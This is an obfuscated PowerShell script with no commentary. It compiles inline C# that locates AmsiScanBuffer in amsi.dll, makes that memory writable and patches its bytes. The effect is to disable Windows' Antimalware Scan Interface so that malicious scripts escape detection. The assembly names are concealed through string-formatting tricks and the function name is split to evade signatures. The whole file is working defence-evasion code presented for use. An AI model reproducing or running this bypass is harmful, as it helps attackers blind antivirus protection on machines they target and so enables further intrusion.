$Ref   =  (  
( 'Sys' + ("{1}{0}"-f'em,','t' )  +(  "{1}{0}" -f'i',' Vers' )  + ("{0}{1}"-f'on','=4.')  +  '0.0'  + ("{2}{3}{4}{1}{0}"-f 're=neutra','ultu','.0',', ','C'  ) +  'l, '+'P'+ 'ub'+'li'  + 'c' +("{1}{0}" -f'eyToke','K')+  'n'  + ( "{1}{0}"-f'a5c','=b77'  )  + '56' +  (  "{2}{0}{1}" -f '8','9','1934e0' )),
( ("{2}{1}{0}"-f 'unt','em.R','Syst')  +'i'  + 'me.'+  'In'+  'ter'+  'o'  +'p'  + (  "{1}{0}" -f'vi','Ser') +  'ces' +( "{1}{3}{5}{4}{2}{6}{0}" -f 'u',', Ve','0,','rsion=','0.0.','4.',' C' )+  ("{2}{1}{3}{0}"-f 'utr','re=n','ltu','e'  ) +  'al,'  +(  "{0}{1}" -f' Pu','bl')  + ( "{1}{0}{2}" -f 'cKeyTo','i','ke'  )  + 'n=b'+(  "{2}{1}{0}" -f'5f7f','f','03') +("{2}{0}{1}" -f '50','a3a','11d') )
  )

$Source = @"
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class AMSI
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero) { return 1; }

            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
            if (ASBPtr == IntPtr.Zero) { return 1; }

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;

            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }

            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);

            return 0;
        }
    }
}
"@

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp


